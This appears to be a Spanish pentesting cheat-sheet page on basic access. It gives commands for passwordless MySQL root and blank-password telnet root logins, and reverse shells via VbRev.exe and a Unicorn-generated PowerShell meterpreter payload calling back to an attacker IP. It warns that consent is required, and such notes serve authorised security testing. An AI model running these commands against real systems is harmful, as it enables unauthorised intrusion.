
# Acceso básico

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">MySQL login anónimo</mark>

```bash
mysql -h TARGET -u root
```

## <mark style="color:purple;">Acceso root telnet</mark>

* Opera en el puerto 23/tcp -> telnet

```bash
telnet {TARGET}
- Acceso con login “root” con blank password
```

## <mark style="color:purple;">Reverse Shell GUI en Windows</mark>

{% embed url="<https://github.com/VbScrub/VbRev>" %}

* Descargamos la última release
* Desde una máquina windows ejecutamos el exe y nos quedamos a la escucha
* En la máquina objetivo ejecutamos lo siguiente:

```bash
VbRev.exe 10.10.12.30 4444
```

## <mark style="color:purple;">Unicorn</mark>

Unicorn es un programa que nos permite con un comando crear un payload para copiar y pegar en una terminal de Powershell y devolvernos una reverse shell.

{% embed url="<https://github.com/trustedsec/unicorn>" %}

```bash
git clone https://github.com/trustedsec/unicorn.git
cd unicorn
python unicorn.py windows/meterpreter/reverse_https 10.10.10.10 443 ms
```

Esto nos crea un archivo de texto. Si copiamos y pegamos los comandos que nos da y tenemos un netcat listener abierto en el puerto que le hemos indicado nos devolverá una conexión reversa.

<figure><img src="/files/xBWqx3prJEgW2WmP97hk" alt=""><figcaption></figcaption></figure>
